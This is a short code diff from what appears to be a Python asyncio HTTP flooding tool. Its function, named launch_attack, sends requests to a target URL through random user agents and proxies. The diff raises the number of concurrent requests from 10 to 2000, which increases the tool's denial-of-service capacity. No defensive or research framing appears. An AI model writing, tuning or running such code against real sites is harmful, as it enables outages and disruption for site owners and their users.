@@ -75,7 +75,7 @@ async def launch_attack(url, duration, user_agents, proxies):
         proxy = random.choice(proxies) if proxies else None
         task = send_request(url, user_agents, proxy)
         tasks.append(task)
-        if len(tasks) >= 10:  # Limit the number of concurrent tasks
+        if len(tasks) >= 2000:  # Limit the number of concurrent tasks
             await asyncio.gather(*tasks)
             tasks.clear()
 
